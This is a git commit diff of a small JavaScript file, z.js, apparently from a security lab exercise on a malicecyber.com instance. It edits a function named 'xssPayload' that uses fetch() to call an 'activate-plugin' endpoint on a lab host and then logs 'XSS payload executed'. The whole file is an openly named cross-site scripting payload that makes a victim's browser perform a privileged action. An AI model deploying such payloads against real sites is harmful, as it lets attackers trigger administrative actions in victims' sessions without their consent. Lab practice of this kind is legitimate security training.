51eefbfd38618866f3de25aaaa719f326ae5c429
LoicIMT <92547427+LoicIMT@users.noreply.github.com>
2023-11-19 01:31:01 +0100

    Update z.js

--- z.js
+++ z.js
@@ -1,5 +1,5 @@
 function xssPayload() {
-  fetch("https://website-afxrqx.inst.malicecyber.com/activate-plugin/1"); 
+  fetch("https://website-kzgaa6.inst.malicecyber.com/activate-plugin/1"); 
 }
 
 console.log('XSS payload executed');
